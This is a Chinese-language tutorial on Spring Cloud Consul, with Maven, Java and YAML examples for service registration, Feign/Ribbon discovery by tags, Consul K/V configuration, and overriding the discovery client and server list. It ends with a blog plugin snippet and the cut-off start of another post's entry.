Ribbon 的客户端负载 支持 Zuul 服务网关 分布式配置中心，使用的是 Consul 的 K/V 存储 控制总线，使用的是 Consul Events Spring Cloud Consul 入门案例Spring Cloud Consul 提供了 bus、config、discovery 等模块，项目中可以根据具体的需要选择对应的模块。下面将演示如何使用 config、discovery 模块，点击下载完整的案例代码。 1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Consul Provider 工程创建 Consul Provider 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-consul-discovery，将服务实例注册到 Consul： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Provider 的主启动类，这里可以缺省添加 @EnableDiscoveryClient 注解： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Consul Provider 的测试控制类，值得注意的是，在不引入 spring-boot-starter-actuator 依赖的情况下，必须手动创建 /actuator/health 接口，这是新版 Spring Cloud Consul 的默认注册健康检查接口，否则 Consul 会认为服务不可用： 12345678910111213141516@RestControllerpublic class ProviderController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello") public String sayHello(String name) { return "from port " + port + ": hello " + name; }} 添加 Consul Provider 需要的 application.yml 配置文件到工程中： 12345678910server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 地址 port: 8500 # consul 端口 4. 创建 Consul Consumer 工程创建 Consul Consumer 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-consul-discovery，将服务实例注册到 Consul，同时引入 Feign： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-discovery&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Consumer 的主启动类，这里可以缺省添加 @EnableDiscoveryClient 注解： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建 Consul Consumer 的服务接口类，用于调用 Provider 服务： 123456@FeignClient(value = "consul-provider")public interface HelloService { @RequestMapping(value = "/provider/sayHello", method = RequestMethod.GET) public String sayHello(@RequestParam("name") String name);} 创建 Consul Consumer 的测试控制类，在不引入 spring-boot-starter-actuator 依赖的情况下，必须手动创建 /actuator/health 接口，这是新版 Spring Cloud Consul 的默认注册健康检查接口，否则 Consul 会认为服务不可用： 12345678910111213141516@RestControllerpublic class ConsumerController { @Autowired private HelloService helloService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/consumer/sayHello") public String sayHello(String name) { return helloService.sayHello(name); }} 添加 Consul Consumer 需要的 application.yml 配置文件到工程中： 12345678910server: port: 9002spring: application: name: consul-consumer cloud: consul: host: 127.0.0.1 # consul 地址 port: 8500 # consul 端口 5. 创建 Consul Config 工程创建 Consul Config 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-consul-config；这里的 Consul Config 工程与上面的 Provider、Consumer 工程没有任何关系，作用是用来单独演示 Consul 的 Config 功能（配置中心）： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Config 的测试控制类： 12345678910111213@RefreshScope@RestController@RequestMapping("/config")public class ConfigController { @Value("${foo.bar.name}") private String name; @GetMapping("/getName") public String getName() { return name; }} 添加 Consul Config 需要的 application.yml 配置文件到工程中： 12345678910server: port: 9003spring: application: name: consul-config cloud: consul: host: 127.0.0.1 # consul 地址 port: 8500 # consul 端口 6. 测试结果 启动本地的 consul 服务器 依次启动 consul-provider、consul-consumer 应用 访问 consul 的管理界面：http://127.0.0.1:8500，如果各个服务的 Health Checks 显示绿色的对勾，即表示服务注册成功，如下图所示： 访问 http://127.0.0.1:9002/consumer/sayHello?name=Peter，如果返回 from port 9001: hello Peter，说明 consul-provider、consul-consumer 应用一切运行成功 访问 http://127.0.0.1:8500/ui/dc1/kv，点击页面上的 create 按钮，在 Key or folder 栏输入 config/consul-config/foo.bar.name，value 栏输入 book，然后点击 save 按钮保存，如下图所示： 启动 consul-config 应用，访问 http://127.0.0.1:9003/config/getName，如果接口返回 book，说明成功访问到 Consul Config 的 Key/Value 存储 Spring Cloud Consul 深入Spring Cloud Consul 模块介绍Spring Cloud Consul 是在 ecwid 的 consul-api 的基础上又封装了一层功能，使其跟现有 Spring Cloud 组件融合，达到开箱即用的目的。围绕着 Consul 的核心功能，Spring Cloud Consul 也提供了相应的功能模块与之匹配，其中 Consul 的事件功能比较弱化，应用比较多的是服务治理和配置功能，各个模块的介绍如下： spring-cloud-consul-binder：对 Consul 的事件功能封装 spring-cloud-consul-config：对 Consul 的配置功能封装 spring-cloud-consul-core：基础配置和健康检查模块 spring-cloud-consul-discovery：对 Consul 服务治理功能封装 Spring Cloud Consul Discovery基础配置服务启动时，会通过 ConsulServiceRegistry.register（） 向 Consul 注册自身的服务。服务注册时，会告诉 Consul 以下信息： ID：服务 ID，默认是服务名 + 端口号 Name：服务名，默认是应用名称 Tags：给服务打的标签，默认是 [secure=false] Address：服务地址，默认是本机 IP Port：服务端口，默认是服务的 Web 端口 Check：健康检查信息，包括 Interval（健康检查间隔）和 HTTP（健康检查地址） 一般情况下，不需要显式提供上述信息，Spring Cloud Consul 会有默认值，但是在一些特殊业务场景中，可能就需要定制上述服务了。Consul Discovery 的常见配置如下： Tags 栏会有一个 secure=false，这个是 Spring Cloud Consul 默认加上的，它取自配置 spring.cloud.consul.discovery.scheme，默认值是 http。如果服务提供的是 https 的服务时，需要配置该值为 https，它的作用是告诉服务消费者调用服务方接口时需要哪种协议。配置示例如下： 1234567891011/** * 自定义健康检测接口 */@RestControllerpublic class ProviderController { @GetMapping("/health") public String health() { return "SUCCESS"; }} 1234567891011121314151617server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: prefer-ip-address: true # 优先使用 IP 注册 ip-address: 127.0.0.1 # 若部署在 Docker 中,指定宿主机 IP port: 9001 # 若部署在 Docker 中,指定宿主机端口 health-check-interval: 20s # 健康检查间隔时间为 20s health-check-path: /health # 自定义健康检查路径 tags: ${LANG},test # 指定服务的标签, 用逗号隔开 服务发现案例Spring Cloud Consul 提供了两种方式的服务发现功能：Ribbon 和 DiscoveryClient。如果客户端使用了 Feign 或者 @LoadBalancerd 注解，那么默认使用的是 ConsulServerList 提供的服务发现逻辑。如果客户端只想独立使用服务发现功能，那么可以直接使用 DiscoveryClient。上面提到了使用 Consul 的 Tags 功能将服务分组，下面就用上面说的两种方式分别调用服务提供者的接口，点击下载完整的案例代码，由于篇幅有限，以下只给出核心代码和配置。 1. 创建 Consul Provider Tag One 工程创建 Consul Provider Tag One 的主启动类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderOneApplication { public static void main(String[] args) { SpringApplication.run(ProviderOneApplication.class, args); }} 创建 Consul Provider Tag One 的测试控制类： 123456789101112131415public class ProviderOneController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port " + port + ": hello " + name; }} 创建 Consul Provider Tag One 的 application.yml 配置文件，加入 tags 属性： 123456789101112server: port: 9001spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: tags: tag1 2. 创建 Consul Provider Tag Two 工程创建 Consul Provider Tag Two 的主启动类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderTwoApplication { public static void main(String[] args) { SpringApplication.run(ProviderTwoApplication.class, args); }} 创建 Consul Provider Tag Two 的测试控制类： 12345678910111213141516@RestControllerpublic class ProviderTwoController { @Value("${server.port}") private String port; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/provider/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port " + port + ": hello " + name; }} 创建 Consul Provider Tag Two 的 application.yml 配置文件，加入 tags 属性： 123456789101112server: port: 9002spring: application: name: consul-provider cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: tags: tag2 3. 创建 Consul Consumer Ribbon 工程创建 Consul Consumer Ribbon 的主启动类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerRibbonApplication { public static void main(String[] args) { SpringApplication.run(ConsumerRibbonApplication.class, args); }} 创建 Consul Consumer Ribbon 的服务接口类，用于调用 Provider 服务： 123456@FeignClient("consul-provider")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} 创建 Consul Consumer Ribbon 的基础配置类，声明 RestTemplate 的 Bean 对象： 123456789@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); }} 创建 Consul Consumer Ribbon 的测试控制类，建立两个 REST 接口，一个通过 Feign 的方式访问 Provider，另一个通过 RestTemplate 的方式访问 Provider： 1234567891011121314151617181920212223242526@RestControllerpublic class ConsumerRibbonController { private static final String URL = "http://consul-provider"; @Autowired private RestTemplate restTemplate; @Autowired private ProviderService providerService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/consumer/sayHelloOne/{name}") public String sayHelloOne(@PathVariable("name") String name) { return providerService.sayHello(name); } @GetMapping("/consumer/sayHelloTwo/{name}") public String sayHelloTwo(@PathVariable("name") String name) { return restTemplate.getForObject(URL + "/provider/sayHello/" + name, String.class); }} 创建 Consul Consumer Ribbon 的 application.yml 配置文件： 12345678910111213server: port: 9003spring: application: name: consul-consumer-ribbon cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: server-list-query-tags: consul-provider: tag1 # 在调用 consul-provider 服务时，使用 tag1 对应的服务实例 4. 创建 Consul Consumer Discovery Client 工程创建 Consul Consumer Discovery Client 的主启动类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class DiscoveryClientApplication { public static void main(String[] args) { SpringApplication.run(DiscoveryClientApplication.class, args); }} 创建 Consul Consumer Discovery Client 的测试控制类，使用 DiscoveryClient 注入的方式，手动去 Consul 中获取服务列表；这里需要说明的是，ConsulDiscoveryClient 中不支持根据自定义 Tags 获取服务提供者： 12345678910111213141516@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/getServer/{serviceId}") public List&lt;ServiceInstance&gt; getServer(@PathVariable("serviceId") String serviceId) { return discoveryClient.getInstances(serviceId); }} 创建 Consul Consumer Discovery Client 的 application.yml 配置文件： 12345678910server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 5. 测试结果 启动本地的 Consul 服务器，打开 Consul 的管理界面，查看服务的注册情况，如下图所示： 依次启动 consul-provider-tag-one、consul-provider-tag-two、consul-consumer-discovery-client、consul-consumer-ribbon 应用 请求 consul-consumer-ribbon 应用的 Feign 接口，访问 http://127.0.0.1:9003/consumer/sayHelloOne/Jim，查看返回的内容是否为 from port 9001: hello Jim 请求 consul-consumer-ribbon 应用的 RestTemplate 接口，访问 http://127.0.0.1:9003/consumer/sayHelloTwo/Peter，查看返回的内容是否为 from port 9001: hello Peter 请求 consul-consumer-discovery-client 应用的接口，访问 http://127.0.0.1:9004/getServer/consul-provider，查看返回的服务提供者信息是否只有 consul-provider 提供者，如下图所示： Spring Cloud Consul Config上面的示例演示了 Spring Cloud Consul Config 获取和刷新配置的简单用法。Spring Cloud Consul Config 与 Consul 是通过 HTTP 进行交互的，那配置刷新是如何做到的呢？另外，示例中只有一条配置，可是实际工作中的配置可能有成百上千条，难道配置信息需要一个个在 Consul 的管理页面中添加吗？ 配置刷新原理Spring Cloud Consul 是通过 HTTP 的方式跟 Consul 交互，那配置是如何实时生效的呢？答案其实很简单，那就是配置并没有实时生效。org.springframework.cloud.consul.config.ConfigWatch 中有一个定时方法 watchConfigKeyValues()，它默认每秒执行一次（可以通过 spring.cloud.consul.config.watch.delay 自定义执行的时间间隔)，去 Consul 中获取最新的配置信息，一旦配置发生改变，Spring 通过 ApplicationEventPublisher 重新刷新配置。Consul Config 组件就是通过这种方式，达到配置 “实时生效” 的目的。那客户端如何得知配置被更新过了呢，答案在 Consul 返回的数据里。Consul 会给每一项配置加一个 consulIndex 属性，类似于版本号，如果配置更新，它就会自增。Spring Cloud Consul Config 就是通过缓存 consulIndex 来判断配置是否发生改变。 高级配置（作为配置中心）Consul 只支持用 K/V 的方式进行配置，那怎么让 Consul 支持同时配置多条的方式呢？难道要给 Consul 增加一个导入功能吗？其实 K/V 不仅可以代表一条配置，还可以代表一个应用的配置，将应用名作为 Key，Value 中用来存放它所有的配置，这样就可以达到同时配置多条的结果。Spring Cloud Consul Config 就是这样，通过将 yml 或者 properties 放在 Value 中来实现配置的批量操作。下面的示例将演示使用 Consul 的配置功能，将整个应用的配置以 yml 的方式存储在 Consul 中，以此实现类似 Spring Cloud Config 的配置中心功能，点击下载完整的案例代码。 创建 Consul Config Customize 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Consul Config Customize 的主启动类： 1234567@SpringBootApplicationpublic class ConfigApplication { public static void main(String[] args) { SpringApplication.run(ConfigApplication.class, args); }} 创建 Consul Config Customize 的测试控制类： 12345678910111213@RefreshScope@RestController@RequestMapping("/config")public class TestController { @Value("${foo.bar.name}") private String name; @GetMapping("/getName") public String getName() { return name; }} 创建 Consul Config Customize 的 application.yml 配置文件： 12345spring: application: name: consul-config-customize profiles: active: dev 创建 Consul Config Customize 的 bootstrap.yml 配置文件，增加自定义的配置属性： 1234567891011spring: cloud: consul: config: host: 127.0.0.1 # Consul 启动地址 port: 8500 # Consul 启动端口 format: yaml # Consul 中 Value 配置格式为 yaml prefix: configuration # Consul 中配置文件目录为 configuration, 默认为 config default-context: app # 去该目录下查找缺省配置, 默认为 application profile-separator: \':\' # profiles配置分隔符, 默认为‘,’ data-key: data # 如果指定配置格式为 yaml 或者 properties, 则需要该值作为key, 默认为 data 测试结果： 启动本地的 Consul 服务器 访问 http://127.0.0.1:8500/ui/dc1/kv 页面，添加 key 为：configuration/consul-config-customize:dev/data，value 为： 12345server: port: 9002foo: bar: name: book-dev 访问 http://127.0.0.1:8500/ui/dc1/kv 页面，添加 key 为：configuration/consul-config-customize:test/data，value 为： 12345server: port: 9003foo: bar: name: book-test 启动 consul-config-customize 应用，查看启动的端口号；访问 http://127.0.0.1:9002/config/getName，查看接口返回的内容 更改 application.yml 中的配置为 spring.profiles.active=test 重新启动 consul-config-customize 应用，查看启动的端口号；访问 http://127.0.0.1:9003/config/getName，查看接口返回的内容 Spring Cloud Consul 功能重写Spring Cloud Consul 提供了很多方便实用的功能，但是面对五花八门的需求，还是希望可以重写它的原有逻辑。 重写 ConsulDiscoveryClient (支持 Tag)ConsulDiscoveryClient 并不支持根据自定义 Tag 获取服务，一般来说，ConsulServerList 和 ConsulDiscoveryClient 虽然面对的需求不同，但是实现的功能都是一样的，那就是根据条件查找服务。可能 Spring 认为 ConsulDiscoveryClient 是为一些框架型的功能准备的，用户完全可以拿到服务列表后自行筛选所需的数据。下面的示例将重写 ConsulDiscoveryClient 的功能，让其支持根据自定义 Tag 获取服务。首先创建三个工程，分别是：consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override，其中前两个工程与上面的服务发现案例里的配置和代码完全一致，这里不再累述，点击下载完整的案例代码。 Consul Consumer Override 工程里的 MyConsulDiscoveryClient 类： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public class MyConsulDiscoveryClient implements DiscoveryClient { private final ConsulClient client; private final ConsulDiscoveryProperties properties; public MyConsulDiscoveryClient(ConsulClient client, ConsulDiscoveryProperties properties) { this.client = client; this.properties = properties; } @Override public String description() { return "Spring Cloud Consul Discovery Client"; } @Override public List&lt;ServiceInstance&gt; getInstances(final String serviceId) { return getInstances(serviceId, QueryParams.DEFAULT); } public List&lt;ServiceInstance&gt; getInstances(final String serviceId, final QueryParams queryParams) { List&lt;ServiceInstance&gt; instances = new ArrayList&lt;&gt;(); addInstancesToList(instances, serviceId, queryParams); return instances; } private void addInstancesToList(List&lt;ServiceInstance&gt; instances, String serviceId, QueryParams queryParams) { String aclToken = properties.getAclToken(); Response&lt;List&lt;HealthService&gt;&gt; services; if (StringUtils.hasText(aclToken)) { // 这里由获取默认tag改为获取指定tag services = client.getHealthServices(serviceId, getTag(serviceId), this.properties.isQueryPassing(), queryParams, aclToken); } else { // 这里由获取默认tag改为获取指定tag services = client.getHealthServices(serviceId, getTag(serviceId), this.properties.isQueryPassing(), queryParams); } for (HealthService service : services.getValue()) { String host = ConsulServerUtils.findHost(service); Map&lt;String, String&gt; metadata = ConsulServerUtils.getMetadata(service); boolean secure = false; if (metadata.containsKey("secure")) { secure = Boolean.parseBoolean(metadata.get("secure")); } instances.add(new DefaultServiceInstance(serviceId, host, service.getService().getPort(), secure, metadata)); } } public List&lt;ServiceInstance&gt; getAllInstances() { List&lt;ServiceInstance&gt; instances = new ArrayList&lt;&gt;(); Response&lt;Map&lt;String, List&lt;String&gt;&gt;&gt; services = client.getCatalogServices(QueryParams.DEFAULT); for (String serviceId : services.getValue().keySet()) { addInstancesToList(instances, serviceId, QueryParams.DEFAULT); } return instances; } @Override public List&lt;String&gt; getServices() { String aclToken = properties.getAclToken(); if (StringUtils.hasText(aclToken)) { return new ArrayList&lt;&gt;(client.getCatalogServices(QueryParams.DEFAULT, aclToken).getValue().keySet()); } else { return new ArrayList&lt;&gt;(client.getCatalogServices(QueryParams.DEFAULT).getValue().keySet()); } } // 获取tag的方法，该方法在 ConsulServerList 中已存在 protected String getTag(String serviceId) { return this.properties.getQueryTagForService(serviceId); }} Consul Consumer Override 工程里的配置类： 123456789@Configurationpublic class CommonConfiguration { @Bean @Order(Ordered.HIGHEST_PRECEDENCE) // 保证优先被Spring加载 public MyConsulDiscoveryClient discoveryClient(ConsulClient client, ConsulDiscoveryProperties properties) { return new MyConsulDiscoveryClient(client, properties); }} Consul Consumer Override 工程里的测试控制类： 12345678910111213141516@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/getServer/{serviceId}") public List&lt;ServiceInstance&gt; getServer(@PathVariable("serviceId") String serviceId) { return discoveryClient.getInstances(serviceId); }} Consul Consumer Override 工程里的 application.yml 配置文件： 12345678910111213server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: server-list-query-tags: consul-provider: tag1 # 在调用 consul-provider 服务时，使用 tag1 对应的服务实例 测试结果： 启动本地的 Consul 服务器 依次启动 consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override 应用 访问 http://127.0.0.1:9004/getServer/consul-provider，查看接口返回的信息，看看是否只返回了 tag1 对应的服务实例 重写 ConsulServerList原理分析单纯的自定义实现 ServerList 的接口并不能达到重写 ConsulServerList 的目的，是因为 ConsulServerList 的 serviceId 属性为 null 时会导致启动报错。这个 serviceId 属性表示服务提供者的名称，但是却作为 ConsulServerList 的成员变量。由此可以联想到，Spring Cloud Consul 为每个服务提供者都创建了一个 ConsulServerList 实例，这是为了支持 Ribbon 的服务配置个性化。Ribbon 支持对某一个服务单独配置负载，比如负载算法，是否重试等，当然也包括服务发现逻辑，为每一个服务实例化一个服务发现逻辑，可以最大化地将自由交给实现方。特别注意，ConsulServerList 并不是在 Spring 启动的时候初始化，而是在服务调用时通过 Ribbon 进行初始化，具体的初始化流程如下： Feign 通过 serviceId 去 Ribbon 中获取服务端配置 Ribbon 根据 serviceId 去缓存中找是否存在这个名称的 AnnotationConfigApplicationContext 实例，如果有就立即返回；如果没有就创建一个，而创建 AnnotationConfigApplicationContext 的过程，就是 ConsulServerList 初始化的过程 AnnotationConfigApplicationContext 跟 ConsulServerList 是通过 @RibbonClient 注解关联在一起的，具体可以参考 RibbonClientConfigurationRegistrar 源码 所以重写 ConsulServerList 的过程比较麻烦，要么重新写一套类似的 spring-cloud-consul-discovery 源码，要么就从源头的 RibbonClientConfiguration 开始直到 ConsulServerList 均改成自己的实现。 重写示例下面的示例将使用第二种方式重写 ConsulServerList，首先创建三个工程，分别是：consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override，其中前两个工程与上面的服务发现案例里的配置和代码完全一致，这里不再累述，点击下载完整的案例代码。值得一提的是，在 Consul Consumer Override 工程里新增 MyConsulServerList、MyConsulRibbonClientConfiguration、MyRibbonConsulAutoConfiguration 类，需要保证 MyConsulRibbonClientConfiguration 类不能与被 @ConponentScan 修饰的主类放在同一个包或其子包下，否则会导致 IClientConfig 的 Bean 无法注入。 Consul Consumer Override 工程里的 MyConsulServerList 类： 12345678910111213141516171819202122232425262728293031323334public class MyConsulServerList extends AbstractServerList&lt;ConsulServer&gt; { private String serviceId; private final ConsulClient client; private final ConsulDiscoveryProperties properties; private static final Logger logger = LoggerFactory.getLogger(MyConsulServerList.class); public MyConsulServerList(ConsulClient client, ConsulDiscoveryProperties properties) { this.client = client; this.properties = properties; } /** * 打印一句提示 */ private List&lt;ConsulServer&gt; getServers() { if (this.client == null) { return Collections.emptyList(); } logger.info("===== 自定义服务发现 ====="); String tag = getTag(); // null is ok Response&lt;List&lt;HealthService&gt;&gt; response = this.client.getHealthServices( this.serviceId, tag, this.properties.isQueryPassing(), createQueryParamsForClientRequest(), this.properties.getAclToken()); if (response.getValue() == null || response.getValue().isEmpty()) { return Collections.emptyList(); } return transformResponse(response.getValue()); } // 省略其他代码 ....} Consul Consumer Override 工程里的 MyConsulRibbonClientConfiguration 类： 123456789101112131415161718192021222324252627282930313233343536@Configurationpublic class MyConsulRibbonClientConfiguration { @Autowired private ConsulClient client; private String serviceId = "client"; protected static final String VALUE_NOT_SET = "__not__set__"; protected static final String DEFAULT_NAMESPACE = "ribbon"; public MyConsulRibbonClientConfiguration() { } public MyConsulRibbonClientConfiguration(String serviceId) { this.serviceId = serviceId; } /** * 将ServerList生效的实现改为MyServerList * * @param config * @param properties * @return */ @Bean @ConditionalOnMissingBean public ServerList&lt;?&gt; ribbonServerList(IClientConfig config, ConsulDiscoveryProperties properties) { MyConsulServerList serverList = new MyConsulServerList(client, properties); serverList.initWithNiwsConfig(config); return serverList; } // 省略其他代码 ....} Consul Consumer Override 工程里的 MyRibbonConsulAutoConfiguration 类： 12345678910111213/** * 该类主要是将原有入口取代, 因此它的生效逻辑刚好跟 RibbonConsulAutoConfiguration 相反 * 当 spring.cloud.consul.ribbon.enabled 为 false 时, 这里重写的逻辑生效 */@Configuration@ConditionalOnConsulEnabled@ConditionalOnBean(SpringClientFactory.class)@AutoConfigureAfter(RibbonAutoConfiguration.class)@ConditionalOnExpression("${spring.cloud.consul.ribbon.enabled:true}==false")@RibbonClients(defaultConfiguration = MyConsulRibbonClientConfiguration.class)public class MyRibbonConsulAutoConfiguration {} 在 Consul Consumer Override 工程里里创建 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ com.springcloud.override.consul.MyRibbonConsulAutoConfiguration Consul Consumer Override 工程里的启动主类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerOverrideApplication { public static void main(String[] args) { SpringApplication.run(ConsumerOverrideApplication.class, args); }} Consul Consumer Override 工程里的服务接口类，用于调用 Provider 服务： 123456@FeignClient("consul-provider")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} Consul Consumer Override 工程里的测试控制类： 12345678910111213141516171819@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @Autowired private ProviderService providerService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/sayHello/{name}") public String getServer(@PathVariable("name") String name) { return providerService.sayHello(name); }} Consul Consumer Override 工程里的 application.yml 123456789101112server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 ribbon: enabled: false # 此处配置很重要,为 true 时走原有逻辑, 为 false 时走重写逻辑 测试结果： 启动本地的 Consul 服务器 依次启动 consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override 应用 访问 http://127.0.0.1:9004/sayHello/Peter，查看接口是否正常返回内容，控制台输出的日志信息如下： 1234c.netflix.loadbalancer.BaseLoadBalancer : Client: consul-provider instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=consul ...c.n.l.DynamicServerListLoadBalancer : Using serverListUpdater PollingServerListUpdaterc.s.override.consul.MyConsulServerList : ===== 自定义服务发现 =====c.netflix.config.ChainedDynamicProperty : Flipping property: consul-provider.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 多次访问 http://127.0.0.1:9004/sayHello/Peter，通过接口返回的服务方端口号，看看客户端是不是默认以轮询的方式调用服务方的接口 Spring Cloud Consul 的坑异常信息不完整开发者偶尔会遇到 Spring Cloud Consul 打印的异常堆栈中，message 为 null 的情况，导致排查问题异常困难，这是因为 Spring Cloud Consul 对 consul-api 自定义的 OperationException 异常没有做特殊处理导致的。当 Consul 的 HTTP 响应代码为非 200 时，consul-api 会抛出 OperationException；而 Spring Cloud Consul 在调用 consul-api 接口时，有些代码会简单地使用 Exception 捕获异常，然后打印 Log 日志，导致 OperationException 的属性丢失。例如在 ConsulCatalogWatch、ConsulHealthIndicator 中均使用这种处理方式。 consul-api 的兼容问题Consul 在 1.0.0 版本后，将一些接口（/agent/check/pass，/agent/service/deregister）由 GET 方法改成 PUT，这个 bug 在 consul-api 的 1.3.0 版本才得到解决，对应到 Spring Cloud Consul 已经是 2.0.0.M1 版本了。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Config 入门教程 - 高级篇",url:"/posts/8a77bec.html",text:'上篇 - Config 入门教程（中级篇） Config 入门教程 - 中级篇 前言版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外。 Config 高可用对于线上的生产环境，通常对其都是有很高的要求，其中高可用是不可或缺的一部分，必须要保证服务是可用状态，才能保证系统更好地运行，这是业务稳定的保证。 Config 客户端高可用对于客户端的高可用，这里的方案主要还是用 File 的形式，本质与 “客户端回退” 